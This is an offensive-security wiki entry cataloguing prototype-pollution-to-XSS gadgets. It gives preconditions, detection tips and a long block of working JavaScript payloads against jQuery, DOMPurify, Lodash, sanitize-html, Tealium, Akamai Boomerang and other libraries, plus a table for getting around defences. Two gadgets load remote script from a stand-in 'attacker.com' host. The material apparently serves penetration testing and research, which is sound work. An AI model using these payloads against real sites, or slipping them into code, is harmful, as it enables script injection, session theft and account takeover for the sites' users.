---
title: DOM XSS — Prototype Pollution to XSS Gadgets
slug: prototype-pollution-xss
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/prototype-pollution-xss]
inbound: []
---

# DOM XSS — Prototype Pollution to XSS Gadgets

## Pattern

Prototype pollution sets properties on `Object.prototype` (or `Array.prototype`). Third-party libraries that read from object properties without `hasOwnProperty` checks inadvertently inherit the polluted property. If the inherited property value is used as HTML, a URL, or an event handler string, execution occurs. This converts a prototype pollution primitive (typically a DOM-based or reflected PP gadget) into XSS.

The cheat sheet catalogues per-library gadgets: Wistia, jQuery (multiple entry points), Google reCAPTCHA, Twitter tag, Tealium, Akamai Boomerang, Lodash, sanitize-html, js-xss, DOMPurify, Google Closure, Marionette/Backbone, Adobe DTM, Embedly, Segment, Knockout, and jQuery `.on`.

## Preconditions

- A prototype pollution source exists (e.g. `jQuery.extend(true, {}, userInput)`, URL hash parsed as object, `qs.parse`, `_.merge`, etc.).
- The target page loads one or more libraries that have known PP-to-XSS gadgets.
- No property descriptor `Object.freeze` / `Object.seal` on `Object.prototype`.

## Detection

- `js_analyzer` source: `location.hash`, URL search params flowing into `_.merge`, `jQuery.extend`, `qs.parse`, `JSON.parse` without prototype strip.
- Static grep: library fingerprint expressions (see gadget table below).
- Dynamic oracle: `Object.prototype.testProp = 1; console.log({}.testProp)` → confirms writeable prototype.

## Triggering

```javascript
// Wistia Embedded Video — innerHTML gadget
Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';
// Fingerprint: return (typeof wistiaEmbeds !== 'undefined')

// jQuery $(x).off — delegateTarget gadget
Object.prototype.preventDefault='x';
Object.prototype.handleObj='x';
Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';
$(document).off('foobar');
// Fingerprint: typeof $.fn.jquery !== 'undefined'

// jQuery $(html) — div array gadget
Object.prototype.div=['1','<img src onerror=alert(1)>','1']
$('<div x="x"></div>')
// Fingerprint: typeof $.fn.jquery !== 'undefined'

// jQuery $.get / $.post — dataType + url gadget (>=3.0.0)
Object.prototype.url = ['data:,alert(1)//'];
Object.prototype.dataType = 'script';
$.get('https://google.com/');
$.post('https://google.com/');

// jQuery $.getScript — src gadget (>=3.4.0)
Object.prototype.src = ['data:,alert(1)//']
$.getScript('https://google.com/')

// jQuery $.getScript — url gadget (3.0.0–3.3.1)
Object.prototype.url = 'data:,alert(1)//'
$.getScript('https://google.com/')

// Google reCAPTCHA — srcdoc gadget
Object.prototype.srcdoc=['<script>alert(1)<\/script>']
// (insert g-recaptcha div)

// Twitter Universal Website Tag — hif gadget
Object.prototype.hif = ['javascript:alert(document.domain)'];
// Fingerprint: typeof twq.version !== 'undefined'

// Tealium Universal Tag — attrs/src gadget
Object.prototype.attrs = {src:1};
Object.prototype.src='https://attacker.com/xss.js'
// Fingerprint: typeof utag.id !== 'undefined'

// Akamai Boomerang — url gadget
Object.prototype.BOOMR = 1;
Object.prototype.url='https://attacker.com/xss.js'
// Fingerprint: typeof BOOMR !== 'undefined'

// Lodash _.template — sourceURL gadget (<= 4.17.15)
Object.prototype.sourceURL = '  alert(1)'
_.template('test')

// sanitize-html — whiteList gadget
Object.prototype['*'] = ['onload']
document.write(sanitizeHtml('<iframe onload=alert(1)>'))

// js-xss filterXSS — whiteList gadget
Object.prototype.whiteList = {img: ['onerror', 'src']}
document.write(filterXSS('<img src onerror=alert(1)>'))

// DOMPurify (<= 2.0.12) — ALLOWED_ATTR gadget
Object.prototype.ALLOWED_ATTR = ['onerror', 'src']
document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))

// DOMPurify (<= 2.0.12) — documentMode gadget
Object.prototype.documentMode = 9

// Google Closure — CLOSURE_BASE_PATH gadget
Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';

// Marionette.js / Backbone.js — tagName/src/onerror gadget
Object.prototype.tagName = 'img'
Object.prototype.src = ['x:x']
Object.prototype.onerror = ['alert(1)']
// (trigger Marionette view render)

// Adobe Dynamic Tag Management — src gadget
Object.prototype.src='data:,alert(1)//'
// Fingerprint: typeof _satellite !== 'undefined'

// Embedly Cards — onload gadget
Object.prototype.onload = 'alert(1)'
// Fingerprint: typeof window.embedly !== 'undefined'

// Segment Analytics.js — script array gadget
Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']
// Fingerprint: typeof analytics.SNIPPET_VERSION !== 'undefined'

// Knockout.js — binding gadget
// (set up ko.applyBindings after setting prototype props)
Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';
ko.applyBindings({})

// jQuery $(x).on — event injection
Object.prototype.on = 'click';
$('body').on('click', function() { alert('Injected Event'); });
$('body').trigger('click');
```

## Bypasses

| Defense | Bypass |
|---|---|
| `Object.freeze(Object.prototype)` | No bypass for gadgets; confirms no PP-to-XSS here |
| `--node-flags=--disallow-code-generation-from-strings` | Only Node.js; browser gadgets unaffected |
| DOMPurify > 2.0.12 patched | Try other sanitizers (sanitize-html, js-xss) or Closure gadgets |
| Library updated past known version | Re-fingerprint exact version; some gadgets work across all versions |
| CSP | Most gadgets use `innerHTML` / `src` — CSP `script-src` may or may not block depending on gadget type |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed., Prototype Pollution section)
- [../prototype-pollution/SUMMARY.md](../prototype-pollution/SUMMARY.md) — prototype pollution class overview
